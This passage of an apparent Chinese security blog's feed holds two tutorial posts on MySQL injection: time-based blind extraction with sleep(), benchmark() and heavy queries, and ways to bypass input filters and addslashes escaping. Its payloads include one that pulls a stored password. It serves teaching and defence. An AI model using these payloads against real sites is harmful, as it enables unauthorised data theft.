&lt;td style=&#34;text-align:center&#34;&gt;菜鸟教程&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ydW5vb2IuY29tLw==&#34;&gt;http://www.runoob.com/&lt;/span&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;10&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;CN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;4&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;微博&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dlaWJvLmNvbS8=&#34;&gt;http://weibo.com/&lt;/span&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;20&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;CN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Facebook&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==&#34;&gt;https://www.facebook.com/&lt;/span&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;USA&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;7&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;stackoverflow&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tLw==&#34;&gt;http://stackoverflow.com/&lt;/span&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;IND&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;基本延时的盲注sleep&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本延时的盲注sleep&#34;&gt;#&lt;/a&gt; 基本延时的盲注:sleep&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from 表名 where id=1 and sleep(2);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配合 if 语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(expr1,expr2,expr3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;expr1是真,返回expr2,否则expr3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from websites where name=&amp;#x27;1&amp;#x27; or if(name=&amp;#x27;Facebook&amp;#x27;,sleep(2),null);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断是否有网站名字为Facebook&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配合截取函数&lt;br&gt;
 substr (string,start,length)&lt;br&gt;
mid(string,start,length)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from websites where name=&amp;#x27;2&amp;#x27; or if(substr((select name from websites where id=1),0,1)=&amp;#x27;G&amp;#x27;,sleep(2),0);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;1benchmark&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1benchmark&#34;&gt;#&lt;/a&gt; 1.benchmark()&lt;/h3&gt;
&lt;p&gt;benchmark 是 MySQL 的一个内置函数，作用是测试一些函数的执行速度.benchmark 中有两个参数，第一个是执行的次数，第二个是要执行的函数或者表达式&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; select benchmark(10000,md5(&amp;#x27;a&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| benchmark(10000,md5(&amp;#x27;a&amp;#x27;)) |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         0 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 row in set (0.01 sec)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; select benchmark(100000000,md5(&amp;#x27;a&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| benchmark(100000000,md5(&amp;#x27;a&amp;#x27;)) |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                             0 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 row in set (14.29 sec)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到执行次数不同，时间也不同，我们接下来用它来达到 sleep 的延时目的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select 1 and if((substr(user(),1,1)=&amp;#x27;r&amp;#x27;),BENCHMARK(10000000,md5(&amp;#x27;a&amp;#x27;)),1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2heavy-query&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2heavy-query&#34;&gt;#&lt;/a&gt; 2.heavy query&lt;/h3&gt;
&lt;p&gt;通过大量的查询导致查询时间变长来达到延时目的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select count(*) from information_schema.tables A,information_schema.tables B;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1 and if((substr(user(),1,1)=&amp;#x27;r&amp;#x27;),(select count(*) from information_schema.tables A,information_schema.tables B;),1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <updated>2023-05-07T07:33:27.765Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/</id>
        <title>SQL注入绕过</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/"/>
        <content type="html">&lt;h1 id=&#34;一字符替换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一字符替换&#34;&gt;#&lt;/a&gt; 一。字符替换&lt;/h1&gt;
&lt;h3 id=&#34;1过滤空格&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1过滤空格&#34;&gt;#&lt;/a&gt; 1. 过滤空格&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%0a,%0b,%0c,%0d,%09,%a0(只在特定字符集才能利用),/**/,括号等&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2select替换成空&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2select替换成空&#34;&gt;#&lt;/a&gt; 2.select 替换成空&lt;/h3&gt;
&lt;p&gt;双写 selectselect&lt;/p&gt;
&lt;h3 id=&#34;3大小写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3大小写绕过&#34;&gt;#&lt;/a&gt; 3. 大小写绕过&lt;/h3&gt;
&lt;p&gt;MySQL 中是不区分大小写的，若是过滤了 SELECT, 就用 select 绕过，其他同理&lt;/p&gt;
&lt;h3 id=&#34;4正则匹配&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4正则匹配&#34;&gt;#&lt;/a&gt; 4. 正则匹配&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;正则匹配\bselect\b可以用形如/*!50000*/方法绕过&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/*!50000*/是一种特殊的注释,里面的SQL会被执行,50000是一个版本号,假设MySQL版本大于这个版本号就执行里面的SQL语句&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5替换了单引号或双引号忘记了反斜杠&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5替换了单引号或双引号忘记了反斜杠&#34;&gt;#&lt;/a&gt; 5. 替换了单引号或双引号，忘记了反斜杠&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM wp_news WHERE id=&amp;#x27;可控点1&amp;#x27; AND title=&amp;#x27;可控点2&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;绕过&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM wp_news WHERE id=&amp;#x27;a\&amp;#x27; AND title=&amp;#x27;OR sleep(1)#&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个可控点的反斜杠转义可控点 1 预置的单引号，导致可控点 2 逃逸出单引号&lt;br&gt;
 eg&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; websites &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;a\&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; url&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;union select 1,2,(select concat(id,0x7e,url)from websites limit 1)#&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;二逃逸引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二逃逸引号&#34;&gt;#&lt;/a&gt; 二。逃逸引号&lt;/h3&gt;
&lt;p&gt;注入的重点是逃逸引号，但开发者往往会做一次 addslashes (转义单双引号，反斜杠), 怎么绕过&lt;/p&gt;
&lt;h3 id=&#34;1编码解码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1编码解码&#34;&gt;#&lt;/a&gt; 1. 编码解码&lt;/h3&gt;
&lt;p&gt;宽字节注入，稍后说&lt;/p&gt;
&lt;h3 id=&#34;2意料之外的注入点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2意料之外的注入点&#34;&gt;#&lt;/a&gt; 2. 意料之外的注入点&lt;/h3&gt;
&lt;p&gt;开发者在转义用户输入时遗漏了一些可注入点.PHP: 文件的上传名，http header,$SERVER [‘PHP_SELF’] 这些变量，稍后举例&lt;/p&gt;
&lt;h3 id=&#34;3二次注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3二次注入&#34;&gt;#&lt;/a&gt; 3. 二次注入&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;username&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;password&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;admin&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;password&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;假设一个表如上图，用户输入:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;into&lt;/span&gt; wp_user &lt;span class=&#34;keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin\&amp;#x27;&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;\&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;some pass&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时库的内容是:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;username&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;password&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;admin’or’1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;somepass&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;引号被转义，正常入库，但是当这个用户名被再次使用时&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$conn&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT password from wp_user where username=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$name&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时 SQL 语句为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; wp_user &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时产生注入&lt;/p&gt;
&lt;h3 id=&#34;4字符串截断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4字符串截断&#34;&gt;#&lt;/a&gt; 4. 字符串截断&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;INSERT INTO wp_news VALUES(2,&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$title&lt;/span&gt;&amp;#x27;,&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$content&lt;/span&gt;&amp;#x27;)&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;假如输入 aaaaaaaaa’,&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;自动转义为aaaaaaaaa\&amp;#x27;,由于字符串长度限制被截取为aaaaaaaaa\,转义了预置的单引号,就能注入了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?title=aaaaaaaaa&amp;#x27;&amp;amp;content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sql 语句是&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;,1,1),(3,4,(select pwd from wp_user limit 1),1)#&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;title&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;content&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;this is title&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;aaaaaaaaa’,&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;4&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;admin_password&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;可发现新加了两行，成功注入&lt;/p&gt;
&lt;p&gt;mid () 函数&lt;br&gt;
 select mid (column_name,start,length)&lt;br&gt;
 right () 函数&lt;br&gt;
从指定字符串的&lt;mark&gt;右侧&lt;/mark&gt;提取给定长度的字符&lt;br&gt;
 select right (column_name,length)&lt;br&gt;
 substr () 函数&lt;br&gt;
与 mid () 一样&lt;br&gt;
 reverse () 函数&lt;br&gt;
反转字符串&lt;/p&gt;
</content>
        <updated>2023-04-28T17:31:47.527Z</updated>
    </entry>
    <entry>
